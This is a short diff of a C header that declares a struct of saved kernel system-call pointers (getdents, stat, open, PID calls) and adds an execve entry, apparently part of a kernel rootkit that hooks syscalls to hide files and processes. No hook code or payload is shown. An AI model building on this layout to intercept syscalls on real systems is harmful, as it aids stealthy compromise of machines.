@@ -23,8 +23,10 @@ struct kernel_syms {
 	long (*old_sys_lstat)(char *, void *);
 	long (*old_sys_fstatat)(int, char *, void *, int);
 	long (*old_sys_open)(char *, int, umode_t);
-        long (*old_sys_getdents)(unsigned int, void *, unsigned int);
-        long (*old_sys_getdents64)(unsigned int, void *, unsigned int);
+	long (*old_sys_getdents)(unsigned int, void *, unsigned int);
+	long (*old_sys_getdents64)(unsigned int, void *, unsigned int);
+	long (*old_sys_execve)(const char *filename, const char **argv,
+				const char **envp);
 
 	/* PID syscalls */
 	long (*old_sys_getpgid)(pid_t);
@@ -82,7 +84,6 @@ struct kernel_syms {
 	int (*filp_close)(void *, void *);
 	void *(*vmalloc)(unsigned int);
 	void *(*vfree)(void *);
-
 };
 
 extern struct kernel_syms ksyms;
